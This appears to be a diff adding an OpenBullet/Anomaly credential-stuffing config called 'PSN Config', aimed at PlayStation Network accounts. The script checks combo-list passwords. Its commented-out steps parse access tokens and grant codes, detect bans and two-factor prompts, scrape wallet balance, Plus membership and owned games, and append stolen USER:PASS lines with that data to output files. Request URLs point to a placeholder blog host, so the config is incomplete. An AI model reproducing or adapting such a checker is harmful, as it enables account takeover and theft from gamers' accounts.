@@ -1,0 +1,260 @@
+[SETTINGS]
+{
+  "Name": "PSN Config",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-28T14:53:45.5384841+04:30",
+  "AdditionalInfo": "",
+  "Author": "ProgrammerX0",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!#license FUNCTION Constant 
+
+REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<PASS>" Contains "myphone1" 
+    KEY "<PASS>" Contains "jniEFM23!@#" 
+    KEY "<PASS>" Contains "123123" 
+  KEYCHAIN Failure OR 
+    KEY "<PASS>" Contains "123qwe123!@#" 
+    KEY "<PASS>" Contains "19701970" 
+    KEY "<PASS>" Contains "cuervo13" 
+    KEY "<PASS>" Contains "1234567" 
+    KEY "<PASS>" Contains "laciguena" 
+    KEY "<PASS>" Contains "hz9cb99j" 
+    KEY "<PASS>" Contains "196001758321532" 
+    KEY "<PASS>" Contains "123123" 
+    KEY "<PASS>" Contains "skyline" 
+
+#balance PARSE "<SOURCE>" LR "TXCC================================<br>---" "<br>================TRANSACTIONS END============enddd</p>" CreateEmpty=FALSE -> CAP "balance" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+END
+
+!#Key_check_PIN KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+!  KEYCHAIN Custom "EXPIRED" OR 
+!    KEY "Password expired" 
+!    KEY "Password credentials are locked" 
+!    KEY "Banned account" 
+!  KEYCHAIN Ban OR 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Custom "2FACTOR" OR 
+!    KEY "Missing device identifier for two step account" 
+
+!#Token PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+!#POST REQUEST POST "http://afhaksjdnfsad.blog.ir/" 
+!  CONTENT "" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#Get REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#req PARSE "<HEADERS(Location)>" LR "https://store.playstation.com/html/webIframeRedirect.html?requestId=" "#" -> VAR "req" 
+
+!#GET_API REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#CODE PARSE "<HEADERS(X-NP-GRANT-CODE)>" LR "" "" -> VAR "CODE" 
+
+!#POST_CODE REQUEST POST "http://afhaksjdnfsad.blog.ir/" 
+!  CONTENT "" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#GET REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#wallet_balance PARSE "<SOURCE>" JSON "wallet_balance" CreateEmpty=FALSE -> CAP "Wallet Balance" 
+
+!#GET_Store REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!#Parse PARSE "<SOURCE>" JSON "member_type" CreateEmpty=FALSE -> CAP "Plus" 
+
+!REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Ban OR 
+!    KEY "Access Denied" 
+!    KEY "<RESPONSECODE>" Contains "403" 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!PARSE "<HEADERS(Location)>" LR "access_token=" "&" -> VAR "access_token" 
+
+!REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!PARSE "<SOURCE>" LR "\",\"name\":\"" "\",\"package" Recursive=TRUE CreateEmpty=FALSE -> VAR "Games" 
+
+!FUNCTION Replace "آ®" "®" "<X>" -> VAR "X" 
+
+!FUNCTION Replace "\\\" --" "(MOVIE)" "<X>" -> VAR "X" 
+
+!FUNCTION Replace "\\\"" "" "<X>" -> VAR "X" 
+
+!REQUEST GET "http://afhaksjdnfsad.blog.ir/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#CODEDEACTIVE PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "CODEDEACTIVE" 
+
+!REQUEST POST "http://afhaksjdnfsad.blog.ir/" 
+!  CONTENT "" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#CODEDEACTIVE PARSE "<SOURCE>" LR "\",\"description\":\"" "\"" -> VAR "DEACTIVE" 
+
+IF "<DEACTIVE>" Contains "blackout"
+
+!FUNCTION Constant "NO" -> VAR "Deactive" 
+
+!UTILITY File "WithOutDeactive.txt" Append "-----------------\\r\\n<USER>:<PASS>\\r\\nDeactive : <Deactive>\\r\\nBalance: <Wallet Balance>\\r\\nPlus: <Plus>\\r\\n====Game-List====\\r\\n<X>\\r\\n" 
+
+ELSE 
+
+!FUNCTION Constant "YES" -> VAR "Deactive" 
+
+!UTILITY File "WithDeactive.txt" Append "-----------------\\r\\n<USER>:<PASS>\\r\\nDeactive : <Deactive>\\r\\nBalance: <Wallet Balance>\\r\\nPlus: <Plus>\\r\\n====Game-List====\\r\\n<X>\\r\\n" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "<Deactive>" Contains "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!UTILITY File "Log.txt" AppendLines "-----------------\\r\\nUSER:PASS\\r\\nDeactive : <Deactive>\\r\\nBalance: <Wallet Balance>\\r\\nPlus: <Plus>\\r\\n====Game-List====\\r\\n<X>\\r\\n" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Success OR 
+!    KEY "<Games>" Contains "RDR2 PRE-ORDER BUNDLE [IN BOX VOUCHER]" 
+
+!UTILITY File "Fortnite.txt" AppendLines "================\\r\\n<USER>:<PASS>\\r\\nBalance: <Wallet Balance>\\r\\n" 
+
